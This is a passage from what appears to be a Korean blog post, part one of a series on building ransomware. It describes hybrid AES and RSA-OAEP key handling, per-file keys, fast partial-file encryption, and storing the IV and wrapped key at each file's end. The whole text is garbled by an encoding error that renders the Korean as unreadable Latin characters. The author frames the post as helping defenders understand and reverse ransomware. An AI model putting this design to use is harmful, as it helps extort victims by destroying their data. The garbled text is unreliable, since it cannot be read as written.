ë™ì‘í•˜ì§€ ì•Šìœ¼ë©° ê³µê²©ì— ë” ë‚˜ì€ ëŒ€ì‘ì„ í•˜ê¸° ìœ„í•´ì„œëŠ” ë‚´ë¶€ì ìœ¼ë¡œ ì–´ë–»ê²Œ ë™ì‘í•˜ëŠ”ì§€ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•˜ë‹¤. ì´ ê²Œì‹œê¸€ì´ ëœì„¬ì›¨ì–´ì˜ ì•”í˜¸ ë©”ì»¤ë‹ˆì¦˜ì„ ë¦¬ë²„ì‹±í•˜ê±°ë‚˜ ê°ì—¼ì„ ë§‰ëŠ”ë° ë„ì›€ì´ ë˜ê¸¸ ë°”ë€ë‹¤. </p><p>ì–´ë–¤ ë°©ì‹ìœ¼ë¡œ ë™ì‘í•˜ëŠ”ì§€ íŒŒì•…í•˜ëŠ”ë° ê°€ì¥ ì¢‹ì€ ë°©ë²•ì€ ì§ì ‘ ë§Œë“¤ì–´ë³´ëŠ” ê²ƒì´ë‹¤. ë”°ë¼ì„œ íŒŒíŠ¸ 1ì—ì„œëŠ” ì›ë¦¬ì™€ ê°œë…ì— ëŒ€í•´ ì„¤ëª…í•˜ê³  íŒŒíŠ¸ 2ì—ì„œëŠ” ì›ë¦¬ë¥¼ ì ìš©ì‹œì¼œ ëœì„¬ì›¨ì–´ë¥¼ ë§Œë“¤ì–´ ë³¼ ê²ƒì´ë‹¤.</p><h1 id="ê¸°ë³¸-ì›ë¦¬"><a href="#ê¸°ë³¸-ì›ë¦¬" class="headerlink" title="ê¸°ë³¸ ì›ë¦¬"></a>ê¸°ë³¸ ì›ë¦¬</h1><p>ëœì„¬ì›¨ì–´ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ ê°œë…ì€ ì‚¬ìš©ë˜ëŠ” ì•”í˜¸í™” ìœ í˜•ì´ë‹¤. ì£¼ë¡œ ì‚¬ìš©ë˜ëŠ” ë‘ ê°€ì§€ê°€ ìˆê³  ê´œì°®ì€ ëœì„¬ì›¨ì–´ë“¤ì—ì„œë„ ì‚¬ìš©ëœë‹¤. ê°„ë‹¨í•˜ê²Œ ì„¤ëª…í•˜ê³  ìŠ¤ìŠ¤ë¡œ ê³µë¶€í•  ìˆ˜ ìˆëŠ” referenceë¥¼ ì œê³µí•  ê²ƒì´ë‹¤.</p><h2 id="ëŒ€ì¹­í‚¤-ì•”í˜¸í™”"><a href="#ëŒ€ì¹­í‚¤-ì•”í˜¸í™”" class="headerlink" title="ëŒ€ì¹­í‚¤ ì•”í˜¸í™”"></a>ëŒ€ì¹­í‚¤ ì•”í˜¸í™”</h2><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled.png"></p><p>ëŒ€ì¹­í‚¤ ì•”í˜¸í™”ëŠ” ëŒ€ë¶€ë¶„ ì‚¬ëŒë“¤ì—ê²Œ ìµìˆ™í•˜ë‹¤. í•œ ê°œì˜ í‚¤ë¥¼ ê°€ì§€ê³  ë°ì´í„° ì•”í˜¸í™”, ë³µí˜¸í™”ì— ëª¨ë‘ ì‚¬ìš©í•œë‹¤. zip íŒŒì¼ì™€ office ë¬¸ì„œ ë“±ì— ì‚¬ìš©ë˜ë©° ì•”í˜¸í™”í•  ë•Œ ì‚¬ìš©í•œ passwordì™€ ë³µí˜¸í™”ì— ì‚¬ìš©í•˜ëŠ” passwordê°€ ê°™ë‹¤.</p><h2 id="ë¹„ëŒ€ì¹­í‚¤-ì•”í˜¸í™”"><a href="#ë¹„ëŒ€ì¹­í‚¤-ì•”í˜¸í™”" class="headerlink" title="ë¹„ëŒ€ì¹­í‚¤ ì•”í˜¸í™”"></a>ë¹„ëŒ€ì¹­í‚¤ ì•”í˜¸í™”</h2><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%201.png"></p><p>ë¹„ëŒ€ì¹­í‚¤ ì•”í˜¸í™”ëŠ” ëŒ€ë¶€ë¶„ ì‚¬ëŒë“¤ì´ í˜¼ë€ìŠ¤ëŸ¬ì›Œí•˜ëŠ” ê°œë…ì´ë‹¤. í•˜ì§€ë§Œ íŠ¹ì • êµ¬í˜„ì„ ìƒê°í•˜ì§€ ì•Šìœ¼ë©´ ì´í•´í•˜ê¸° ì‰½ë‹¤.</p><p>ì¼ë°˜ì ìœ¼ë¡œ ë¹„ëŒ€ì¹­í‚¤ ì•”í˜¸í™”ëŠ” ë‘ ê°œì˜ í‚¤ë¥¼ ì‚¬ìš©í•œë‹¤. ëª¨ë“  í‚¤ë¥¼ ì‚¬ìš©í•´ì„œ íŒŒì¼ì„ ì•”í˜¸í™”í•  ìˆ˜ ìˆì§€ë§Œ ë‹¤ë¥¸ í‚¤ë¥¼ ì‚¬ìš©í•´ì„œ ë³µí˜¸í™”ë¥¼ í•´ì•¼ í•œë‹¤.</p><p>secret keyì™€ public keyì— ëŒ€í•´ì„œ ë“¤ì–´ë´¤ì„ ê²ƒì´ë‹¤. ì´ê²ƒë“¤ì€ ì´ë¦„ì²˜ëŸ¼ ë‹¨ìˆœí•˜ê²Œ public í•˜ê±°ë‚˜ secret í•˜ê²Œ ë³´ê´€ë˜ëŠ” í‚¤ì´ë‹¤. ëˆ„êµ¬ë‚˜ public keyì— ì ‘ê·¼í•  ìˆ˜ ìˆê³  ì•”í˜¸í™”ì— ì‚¬ìš©í•  ìˆ˜ ìˆì§€ë§Œ ë³µí˜¸í™”ì— secret keyê°€ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— í•´ë‹¹ í‚¤ì˜ ì†Œìœ ìë§Œì´ ë³µí˜¸í™”í•  ìˆ˜ ìˆë‹¤. ê·¸ë¦¬ê³  secret keyë¥¼ ì‚¬ìš©í•´ ëª¨ë“  ì •ë³´ë¥¼ ì•”í˜¸í™”í•  ìˆ˜ ìˆìœ¼ë©° í•´ë‹¹ í‚¤ ì†Œìœ ìì˜ public keyë¥¼ í†µí•´ ëˆ„êµ¬ë‚˜ ì½ì„ ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ í–‰ìœ„ë¥¼ signingì´ë¼ ë¶€ë¥´ë©° ë¹„ë°€ ëª©ì ì´ ì•„ë‹ˆë¼ í•´ë‹¹ ë©”ì‹œì§€ë¥¼ ë³´ë‚¸ ì‚¬ëŒì„ ì¦ëª…í•˜ê¸° ìœ„í•´ì„œ ì‚¬ìš©ëœë‹¤.</p><h1 id="ëœì„¬ì›¨ì–´-ê´€ë ¨-ì• í”Œë¦¬ì¼€ì´ì…˜"><a href="#ëœì„¬ì›¨ì–´-ê´€ë ¨-ì• í”Œë¦¬ì¼€ì´ì…˜" class="headerlink" title="ëœì„¬ì›¨ì–´ ê´€ë ¨ ì• í”Œë¦¬ì¼€ì´ì…˜"></a>ëœì„¬ì›¨ì–´ ê´€ë ¨ ì• í”Œë¦¬ì¼€ì´ì…˜</h1><p>regular infectionì˜ íë¦„ì„ ìƒê°í•´ë³´ì. ëœì„¬ì›¨ì–´ í˜ì´ë¡œë“œëŠ” ì—¬ëŸ¬ ê°€ì§€ ë²¡í„°(í”¼ì‹±, ì†Œí”„íŠ¸ì›¨ì–´ ì·¨ì•½ì  ë“±) ì¤‘ í•˜ë‚˜ì— ì˜í•´ ì „ë‹¬ë˜ê³  ì‹¤í–‰ë˜ì–´ ëª¨ë“  íŒŒì¼ì´ ì•”í˜¸í™”ëœë‹¤. ê·¸ í›„ íŒŒì¼ì„ ë³µí˜¸í™”í•˜ê¸° ìœ„í•´ ë¬´ì–¸ê°€ë¥¼ ì§€ë¶ˆí•˜ë¼ëŠ” ì°½ì´ ëœ¬ë‹¤. ì´ë¥¼ ì–´ë–»ê²Œ ìˆ˜í–‰í•  ìˆ˜ ìˆì„ê¹Œ?</p><p>ì²« ë²ˆì§¸ëŠ” ëŒ€ì¹­í‚¤ ì•”í˜¸í™”ë¥¼ í†µí•´ íŒŒì¼ì„ ì•”í˜¸í™”í•˜ëŠ” ê²ƒì´ë‹¤. í•˜ì§€ë§Œ ì´ëŠ” ì¢‹ì€ ë°©ë²•ì´ ì•„ë‹ˆë‹¤. ê´œì°®ì€ ëœì„¬ì›¨ì–´ë“¤ì€ í•œ ê°€ì§€ ì¤‘ìš”í•œ ì´ìœ ë¡œ ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ”ë‹¤. ëœì„¬ì›¨ì–´ê°€ íŒŒì¼ì„ ì•”í˜¸í™”í•  ë•Œ, ì–´ë”˜ê°€ì— ì•”í˜¸í™” í‚¤ê°€ ì¡´ì¬í•  ê²ƒì´ë‹¤. ëŒ€ì¹­í‚¤ ì•”í˜¸í™”ë¥¼ ì‚¬ìš©í•œë‹¤ë©´ ì•”í˜¸í™”ì— ì‚¬ìš©ëœ í‚¤ê°€ ë³µí˜¸í™”ì— ì‚¬ìš©ë  ìˆ˜ ìˆë‹¤. í¬ë Œì‹ ë¶„ì„ê°€ê°€ ì•”í˜¸í™”ì— ì‚¬ìš©ëœ í‚¤ë¥¼ ë³µêµ¬í•˜ì—¬ íŒŒì¼ì„ ë³µí˜¸í™”í•  ìˆ˜ ìˆë‹¤. ë¹„ëŒ€ì¹­ keyë¥¼ ì‚¬ìš©í•˜ë©´ ì•”í˜¸í™”ì™€ ë³µí˜¸í™”ì— ë‹¤ë¥¸ í‚¤ë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ ë³µí˜¸í™” í‚¤ë§Œ ì˜ ë³´í˜¸í•˜ë©´ victimì˜ ì»´í“¨í„°ì— ì•”í˜¸í™” í‚¤ê°€ ìˆëŠ” ê²ƒì€ í° ë¬¸ì œê°€ ë˜ì§€ ì•ŠëŠ”ë‹¤.</p><p>í•´ì»¤ë¡œì„œ ê³ ë¯¼í•´ì•¼ í•  ë‹¤ë¥¸ ì¤‘ìš”í•œ ì ì€ victimì´ ì§€ë¶ˆí–ˆì„ ê²½ìš°ë¥¼ ìœ„í•œ í‚¤ê°€ í•„ìš”í•œ ê²ƒì´ë‹¤. ëŒ€ì¹­í‚¤ ì•”í˜¸í™”ë¥¼ ì‚¬ìš©í•˜ë©´ ë°”ì´ë„ˆë¦¬ ì½”ë“œì— í‚¤ë¥¼ í•˜ë“œì½”ë”©(ë¦¬ë²„ì‹±í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì•ˆ ì¢‹ì€ ë°©ë²•ì´ë‹¤)í•˜ê±°ë‚˜ í‚¤ë¥¼ ìƒì„±í•´ì„œ ìš°ë¦¬ì˜ ì„œë²„ì— ì „ì†¡í•  ë°©ë²•(intercept ë‹¹í•  ìˆ˜ ìˆê³  ì—°ê²°ì´ ëŠì–´ì§€ë©´ í‚¤ê°€ ì—†ì–´ì„œ í‚¤ë¥¼ ì¤„ ìˆ˜ ì—†ë‹¤)ì„ ì°¾ì•„ì•¼ í•œë‹¤. <a href="https://www.computerworld.com/article/2489311/cryptodefense-ransomware-leaves-decryption-key-accessible.html">ì´ëŸ° í˜•íƒœì˜ ì²« ë²ˆì§¸ ëœì„¬ì›¨ì–´ëŠ” CryptoDefenseì˜ ë³€ì¢…</a>ìœ¼ë¡œ ìƒì„±ëœ í‚¤ë¥¼ ì„œë²„ë¡œ ì „ì†¡í•œ í›„ victimì˜ ë¡œì»¬ì— íŒŒì¼ì„ ë‚¨ê¸°ëŠ” ë°”ëŒì— ë³µí˜¸í™”ê°€ ê°€ëŠ¥í–ˆë‹¤.</p><p>ì´ëŸ¬í•œ ì ì€ íŒŒì¼ì„ ì•”í˜¸í™”í•  ë•Œ ë¹„ëŒ€ì¹­í‚¤ ì•”í˜¸í™”ë¥¼ ì‚¬ìš©í•´ì•¼ í•œë‹¤ëŠ” ê±¸ ì•Œë ¤ì¤€ë‹¤. í•˜ì§€ë§Œ key pairë¥¼ ìƒì„±í•œ í›„ public keyë¥¼ ì½”ë“œì— í•˜ë“œ ì½”ë”©í•˜ì—¬ ëª¨ë“  íŒŒì¼ì„ ì•”í˜¸í™”í•˜ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•˜ë‹¤.</p><p>ë¹„ëŒ€ì¹­í‚¤ ì•”í˜¸í™”ëŠ” ëŒ€ì¹­í‚¤ ì•”í˜¸í™”ì— ë¹„í•´ì„œ ëŠë¦¬ë‹¤. íŒŒì¼ì„ ì•”í˜¸í™”ëŠ” ê²ƒì´ ì˜¤ë˜ ê±¸ë¦¬ë©´ victimì´ ì•Œì•„ì°¨ë¦¬ê³  ì»´í“¨í„°ë¥¼ êº¼ì„œ ì•”í˜¸í™”ê°€ ì‹¤íŒ¨í•  ìˆ˜ ìˆë‹¤. ê·¸ëŸ¬ë©´ ì–´ë–»ê²Œ í•´ì•¼ í• ê¹Œ?</p><h2 id="í•˜ì´ë¸Œë¦¬ë“œ-ì ‘ê·¼ë²•"><a href="#í•˜ì´ë¸Œë¦¬ë“œ-ì ‘ê·¼ë²•" class="headerlink" title="í•˜ì´ë¸Œë¦¬ë“œ ì ‘ê·¼ë²•"></a>í•˜ì´ë¸Œë¦¬ë“œ ì ‘ê·¼ë²•</h2><p>ì´ ë¬¸ì œë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ í•˜ì´ë¸Œë¦¬ë“œ ì ‘ê·¼ë²•ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. í˜ì´ë¡œë“œë¥¼ ìƒì„±í•  ë•Œ í˜ì´ë¡œë“œì™€ ê´€ë ¨ëœ public/private keyë„ ìƒì„±í•œë‹¤. í˜ì´ë¡œë“œì— public keyë¥¼ í•˜ë“œ ì½”ë”©í•˜ê³  infectionì´ ë°œìƒí•  ë•Œë§ˆë‹¤ í˜ì´ë¡œë“œëŠ” ëŒ€ì¹­ ì•”í˜¸í™”ì— ì‚¬ìš©ë  í‚¤ë¥¼ ìƒì„±í•œë‹¤. ì•”í˜¸í™”ê°€ ë˜ë©´ í•˜ë“œ ì½”ë”©ëœ public keyë¡œ ëŒ€ì¹­ í‚¤ë¥¼ ì•”í˜¸í™”í•œë‹¤(ë¬¼ë¡  ë©”ëª¨ë¦¬/ë””ìŠ¤í¬ì˜ í‰ë¬¸ ëŒ€ì¹­í‚¤ëŠ” ì—†ì•¤ë‹¤). ì•”í˜¸í™”ëœ ëŒ€ì¹­ í‚¤ëŠ” ì–´ë”˜ê°€ì— ì €ì¥ëœë‹¤. í•˜ì§€ë§Œ ë‹¤ë¥¸ ë¬¸ì œê°€ ì¡´ì¬í•œë‹¤.</p><h3 id="Key-re-utilization-chosen-plaintext-attack"><a href="#Key-re-utilization-chosen-plaintext-attack" class="headerlink" title="Key re utilization / chosen plaintext attack"></a>Key re utilization / chosen plaintext attack</h3><p><a href="https://simple.wikipedia.org/wiki/Chosen-plaintext_attack">Chosen plaintext attack</a>ì€ ì•”í˜¸í™” ì „ í‰ë¬¸ì„ ì•Œê³  ìˆê³  ì•”í˜¸í™”ëœ ìƒ˜í”Œì´ ë§ì„ ê²½ìš° ì•”í˜¸í™”ëœ ê²°ê³¼ì—ì„œ í‚¤ë¥¼ ìœ ì¶”í•  ìˆ˜ ìˆëŠ” ì•”í˜¸í™” ê³µê²©ì´ë‹¤. ì˜ ì•Œë ¤ì§„ í¬ë§·ì„ ê°€ì§„ ëŒ€ë¶€ë¶„ íŒŒì¼ì˜ í—¤ë”ì—ì„œ ë°œìƒí•  ìˆ˜ ìˆë‹¤. ëª¨ë“  íŒŒì¼ì— ê°™ì€ í‚¤ë¥¼ ì‚¬ìš©í•œë‹¤ë©´ íŠ¹ì • ì¡°ê±´ì—ì„œ ë³µí˜¸í™”ë  ìˆ˜ ìˆë‹¤. <a href="https://blog.checkpoint.com/2014/08/27/hacking-the-hacker/">ì´ ë¬¸ì œëŠ” ì‹¤ì œë¡œ DirCryptì—ì„œ ë°œìƒí–ˆë‹¤</a>. ì˜ëª»ëœ ì•”í˜¸í™” êµ¬í˜„ê³¼ key ì¬ì‚¬ìš©ìœ¼ë¡œ ì¸í•´ ì•”í˜¸í™”ê°€ ë¦¬ë²„ì‹± ë˜ì—ˆë‹¤.</p><p>ì´ ì´ìŠˆëŠ” ê° íŒŒì¼ì— ë‹¤ë¥¸ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ê²°í•  ìˆ˜ ìˆë‹¤. íŒŒì¼ë§ˆë‹¤ ëŒ€ì¹­í‚¤ë¥¼ ìƒì„±í•´ì„œ ì•”í˜¸í™”í•˜ê³  í˜ì´ë¡œë“œì— ìˆëŠ” public keyë¡œ í‚¤ë¥¼ ì•”í˜¸í™”í•œ í›„ ì•”í˜¸í™”ëœ ëŒ€ì¹­ í‚¤ë¥¼ ì €ì¥í•˜ê³  í‰ë¬¸ìœ¼ë¡œ ëœ ëŒ€ì¹­ í‚¤ë¥¼ ì‚­ì œí•  ìˆ˜ ìˆë‹¤.</p><p>ë§ì€ ëœì„¬ì›¨ì–´ë“¤ì€ ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ëœ íŒŒì¼ ì´ë¦„ + ì•”í˜¸í™”ëœ public keyê°€ ì íŒ í…ìŠ¤íŠ¸ íŒŒì¼ì„ ìƒì„±í•œë‹¤. ë³µí˜¸í™” íˆ´ì„ ì‚¬ìš©í•˜ë©´ ì´ í…ìŠ¤íŠ¸ íŒŒì¼ì„ ì½ì–´ì„œ private keyë¡œ ê° í‚¤ë¥¼ ë³µí˜¸í™”í•œ í›„ íŒŒì¼ì„ ë³µí˜¸í™”í•œë‹¤. ìš°ë¦¬ëŠ” ë‹¤ë¥¸ ê²ƒì„ ì‚¬ìš©í•  ê²ƒì´ë‹¤.</p><blockquote><p>Technical note: ì´ëŸ¬í•œ ìœ í˜•ì˜ ê³µê²©ì€ ê¸°ë³¸ì ìœ¼ë¡œ ê° íŒŒì¼ ìŠ¤íŠ¸ë¦¼ì— ë‹¤ë¥¸ randomized initialization vector(IV)ë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ ìš°ë¦¬ê°€ ì‚¬ìš©í•  AES-256ì—ëŠ” ì˜í–¥ì„ ë°›ì§€ ì•Šì§€ë§Œ, ëª¨ë“  ëœì„¬ì›¨ì–´ì— ëŒ€í•œ ì¼ë°˜ì ì¸ ê°œë…ì„ ì„¤ëª…í•˜ê³  ì‹¶ì—ˆë‹¤. ì•…ì„±ì½”ë“œ ê°œë°œìê°€ ì‹¤ìˆ˜í•˜ë©´ ë°ì´í„°ë¥¼ ë³µêµ¬í•˜ëŠ”ë° ë„ì›€ì´ ë˜ì—ˆìœ¼ë©´ í•œë‹¤.</p></blockquote><p><a href="https://stackoverflow.com/questions/7932061/is-the-result-of-a-rsa-encryption-guaranteed-to-be-random/7933071#7933071">ì´ ê³µê²©ì€ ê¸°ë³¸ì ìœ¼ë¡œ randomize ë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— RSA ì•”í˜¸í™”ì— ì˜í–¥ì„ ì¤„ ìˆ˜ ìˆë‹¤</a>. ë‹¤ìŒì˜ ì´ìœ  ë•Œë¬¸ì— ìš°ë¦¬ì— ëŒ€í•´ì„œëŠ” ë¬¸ì œê°€ ë˜ì§€ ì•Šì„ ê²ƒì´ë‹¤:<br>a) RSAë¥¼ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”í•  ê²ƒì€ AES ì•”í˜¸í™” í‚¤ë¿ì´ë©° ë¶„ì„í•  ìƒ˜í”Œì„ êµ¬ì„±í•˜ì§€ ì•ŠëŠ”ë‹¤.<br>b) ì•”í˜¸í™”ì— randomziationì„ ì¶”ê°€í•˜ëŠ” <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Optimal asymmetric encryption padding</a>ê³¼ ê²°í•©ëœ RSAë¥¼ ì‚¬ìš©í•  ê²ƒì´ë‹¤.</p><p>íŒŒì¼ë§ˆë‹¤ ë‹¤ë¥¸ í‚¤ë¥¼ ì‚¬ìš©í•´ì„œ ì˜¤ëŠ” ë‹¤ë¥¸ ì´ë“ì€ ê° íŒŒì¼ì„ ì•”í˜¸í™”í•œ í›„ ì•”í˜¸í™” í‚¤ë¥¼ ì‚­ì œí•  ìˆ˜ ìˆëŠ” ê²ƒì´ë‹¤. ë”°ë¼ì„œ ë¶„ì„ê°€ê°€ í‚¤ë¥¼ ë³µêµ¬í•˜ë ¤ê³  í•˜ë©´ ë§ˆì§€ë§‰ íŒŒì¼ì— ì‚¬ìš©ëœ í‚¤ë§Œ ë³µêµ¬í•  ìˆ˜ ìˆë‹¤. ëª¨ë“  íŒŒì¼ì— ê°™ì€ í‚¤ë¥¼ ì‚¬ìš©í•˜ë©´ ì•”í˜¸í™” ê³¼ì •ì˜ ì–´ë–¤ ë¶€ë¶„ì—ì„œë“  í‚¤ë¥¼ ë³µêµ¬í•  ìˆ˜ ìˆê³  ëª¨ë“  íŒŒì¼ì„ ë³µêµ¬í•  ìˆ˜ ìˆë‹¤.</p><h1 id="ì†ë„-ê³ ë ¤"><a href="#ì†ë„-ê³ ë ¤" class="headerlink" title="ì†ë„ ê³ ë ¤"></a>ì†ë„ ê³ ë ¤</h1><p>ìœ„ì—ì„œ ì„¤ëª…í•œ ëª¨ë“  íŠ¹ì§•ì„ ì ìš©ì‹œì¼œ ì½”ë”©í•œ ëœì„¬ì›¨ì–´ëŠ” ë§Œì¡±ìŠ¤ëŸ½ì§€ ì•Šì•˜ë‹¤. 32ë¹„íŠ¸ í‚¤(AES-256)ë¥¼ ì‚¬ìš©í•  ë•Œ ì´ˆê¸° ë²¤ì¹˜ë§ˆí¬ì—ì„œ 1ë¶„ì— 1GB ì•”í˜¸í™” ì†ë„ê°€ ë‚˜ì™”ë‹¤. ì´ ì†ë„ëŠ” victimì˜ í•˜ë“œì›¨ì–´ ì˜ì¡´ì„±ì´ ë†’ê³ , í•„ìì˜ ì»´í“¨í„°ë¥¼ ì•”í˜¸í™”í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ VMì—ì„œ ì‹¤í–‰í–ˆì§€ë§Œ ì—¬ì „íˆ 1TBë¥¼ ì•”í˜¸í™”í•˜ëŠ”ë° 16ë¶„ì´ ê±¸ë ¸ë‹¤.</p><p>í˜„ëŒ€ì˜ ëœì„¬ì›¨ì–´ë“¤ì€ ì–´ë–»ê²Œ ëª‡ ê¸°ê°€ë°”ì´íŠ¸ì˜ ì •ë³´ë¥¼ ì´ˆ ë‹¨ìœ„ë¡œ ì•”í˜¸í™”í• ê¹Œ? ì •ë‹µì€ íŒŒì¼ êµ¬ì¡°(file structure)ì— ìˆë‹¤.</p><p>ì‚¬ì‹¤ìƒ íŒŒì¼ì˜ ëª¨ë“  ë¶€ë¶„ì„ ì‚¬ìš©í•  ìˆ˜ ì—†ê²Œ ì•”í˜¸í™”í•  í•„ìš”ê°€ ì—†ë‹¤. íŒŒì¼ í¬ë§·ì— ë”°ë¼ í—¤ë”ì™€ initial bytesë§Œ ì•”í˜¸í™”í•´ë„ ì‚¬ìš©í•  ìˆ˜ ì—†ê²Œ ë§Œë“¤ ìˆ˜ ìˆë‹¤. ì•„ë§ˆë„ íŒŒì¼ì˜ ì²« 5MBë§Œ ì•”í˜¸í™”í•˜ë©´ ëœë‹¤. ë¬´ìŠ¨ ìƒê°ì„ í•˜ëŠ”ì§€ ì•Œê³  ìˆë‹¤. txt/ascii íŒŒì¼ ê°™ì€ ê°„ë‹¨í•œ íŒŒì¼ì€ <a href="https://linux.die.net/man/1/strings">strings</a> ê°™ì€ íˆ´ì„ ì‚¬ìš©í•´ì„œ ì½ì„ ìˆ˜ ìˆì§€ë§Œ ê·¸ëŸ° íŒŒì¼ë“¤ì€ ëŒ€ë¶€ë¶„ 2kbë¥¼ ë„˜ì§€ ì•ŠëŠ”ë‹¤. ê²Œë‹¤ê°€ victimì—ê²Œ ì¤‘ìš”í•œ íŒŒì¼ ëŒ€ë¶€ë¶„ì€ ë¬¸ì„œ, ì‚¬ì§„, ë¹„ë””ì˜¤ì´ë‹¤. íŒŒì¼ì— ëŒ€í•´ í¬ë Œì‹ ë¶„ì„ì„ ì‹œë„í•˜ê³  ë‚´ìš© ì¼ë¶€ë¥¼ ë³µêµ¬í•  ìˆ˜ ìˆì§€ë§Œ ê°œë³„ì ì¸ íŒŒì¼ì— ëŒ€í•´ ìˆ˜í–‰í•˜ëŠ” ìˆ˜ë™ì ì¸ ë°©ë²•ì´ê³  í˜„ì‹¤ì ì´ì§€ ì•Šë‹¤.</p><p>íŒŒì¼ì˜ ë§ˆì§€ë§‰ ë¶€ë¶„ì„ ë°”ê¾¸ëŠ” ê²ƒë„ ì´ìƒì ì´ë©° ë ë¶€ë¶„ì— 2ê°œì˜ êµ¬ì¡°ë¥¼ ì¶”ê°€í•˜ì—¬ í™œìš©í•  ìˆ˜ ìˆë‹¤.</p><ol><li>Initalization vector: AESë¡œ íŒŒì¼ì„ ì•”í˜¸í™”í•  ë•Œ initialization vectorê°€ í•„ìš”í•˜ë‹¤. ì´ëŠ” ì•”í˜¸í™” í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹œì‘í•  ë•Œ ìƒì„±ëœë‹¤.</li><li>Encrypted decryption key: ê° íŒŒì¼ì˜ ëì— ì•”í˜¸í™”ëœ ë³µí˜¸í™” í‚¤ë¥¼ ì¶”ê°€í•  ìˆ˜ ìˆë‹¤. ì´ëŠ” íŒŒì¼ë“¤ì˜ ì•”í˜¸í™” í‚¤ë¥¼ ë‹´ì€ text íŒŒì¼ì˜ í•„ìš”ì„±ì„ ì—†ì• ì¤€ë‹¤.</li></ol><p>ì´ëŸ° ê²ƒë“¤ì´ ì¶”ê°€ëœ ì•”í˜¸í™”ëœ íŒŒì¼ êµ¬ì¡°ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤:</p><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%202.png"></p><p>â€œíŒŒì¼ì˜ ì¼ë¶€ë§Œ ì•”í˜¸í™”í•˜ëŠ” ê²ƒâ€ì˜ ë˜ ë‹¤ë¥¸ ì´ì ì€ ì›ë³¸ íŒŒì¼ì„ ì§€ìš°ê³  ì•”í˜¸í™”ëœ íŒŒì¼ì„ ìƒì„±í•  í•„ìš”ê°€ ì—†ëŠ” ê²ƒì´ë‹¤. ìƒˆ íŒŒì¼ì„ ìƒì„±í•  í•„ìš” ì—†ì´ ì¡´ì¬í•˜ëŠ” íŒŒì¼ì— ì“°ê¸° ê¶Œí•œë§Œ ìˆìœ¼ë©´ ëœë‹¤. ë˜í•œ 500gb MySQL ë°ì´í„°ë² ì´ìŠ¤ ê°™ì€ ë§¤ìš° í° íŒŒì¼ì„ ë¹ ë¥´ê²Œ ì•”í˜¸í™”í•  ìˆ˜ ìˆë‹¤.</p><h1 id="ë§ˆì§€ë§‰-ê³ ë ¤ì‚¬í•­"><a href="#ë§ˆì§€ë§‰-ê³ ë ¤ì‚¬í•­" class="headerlink" title="ë§ˆì§€ë§‰ ê³ ë ¤ì‚¬í•­"></a>ë§ˆì§€ë§‰ ê³ ë ¤ì‚¬í•­</h1><p>ê° ê³¼ì •ì— ëŒ€í•´ ì ì ˆí•œ ì•”í˜¸í™”ë¥¼ ì„ íƒí•˜ë©´ ì•…ì„±ì½”ë“œë¥¼ ë°°í¬í•˜ê¸° ìœ„í•œ í”„ë ˆì„ì›Œí¬ë¥¼ ë””ìì¸í•´ì•¼ í•œë‹¤. ëª¨ë“  victimì´ ê°™ì€ í‚¤ë¥¼ ê³µìœ í•˜ëŠ” ê±¸ ì›í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ í˜ì´ë¡œë“œë§ˆë‹¤ í‚¤ë¥¼ ìë™ì ìœ¼ë¡œ ìƒì„±í•˜ëŠ” processë¥¼ í¬í•¨í•´ì•¼ í•œë‹¤(í•œ ëª…ì´ ransomì„ ì§€ë¶ˆí•˜ê³  keyë¥¼ ë°°í¬í•˜ë©´ ëª¨ë‘ê°€ ì•”í˜¸í™”í•  ìˆ˜ ìˆëŠ” ê±¸ ë°©ì§€í•´ì•¼í•œë‹¤). ê° victimì— ëŒ€í•œ í‚¤ë¥¼ ì €ì¥í•˜ëŠ” ë°ì´í„°ë² ì´ìŠ¤ë„ í•„ìš”í•˜ë‹¤.</p><p>ì´ ë¶€ë¶„ì€ ë‚˜ìœ ëª©ì ìœ¼ë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì½”ë”©í•˜ì§€ ì•Šê³  ì–´ë–»ê²Œ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ”ì§€ë„ ì„¤ëª…í•˜ì§€ ì•Šì„ ê²ƒì´ë‹¤. ì´ ê¸€ì˜ ì•„ì´ë””ì–´ëŠ” ë³´ì•ˆ íŒ€ë“¤ì´ ì´ì „ ëœì„¬ì›¨ì–´ê°€ ì˜ëª»ë˜ì—ˆê³ , ê°ì—¼ ë°œìƒ/í™•ì‚°ì„ ë§‰ì„ ìˆ˜ ìˆìŒì„ ë³´ì—¬ì¤„ ê²ƒì´ë‹¤.</p><p>ë‹¨ì¼ í˜ì´ë¡œë“œì— ì‚¬ìš©í•  ë¹„ëŒ€ì¹­ í‚¤ë¥¼ ìƒì„±í•˜ê¸° ìœ„í•´ ssh-keygenì„ ì‚¬ìš©í•  ê²ƒì´ë‹¤.</p><pre><code class="hljs angelscript">ssh-keygen -b <span class="hljs-number">2048</span> -m pem -f pem</code></pre><p>ì´ ëª…ë ¹ì–´ëŠ” pem í¬ë§·ìœ¼ë¡œ public(<code>pem.pub</code>)ê³¼ private key(<code>pem</code>)ì„ ìƒì„±í•œë‹¤. <code>pem.pub</code>ë¥¼ ì™„ì„±ëœ ì‹¤í–‰ íŒŒì¼ê³¼ í•©ì³ì„œ 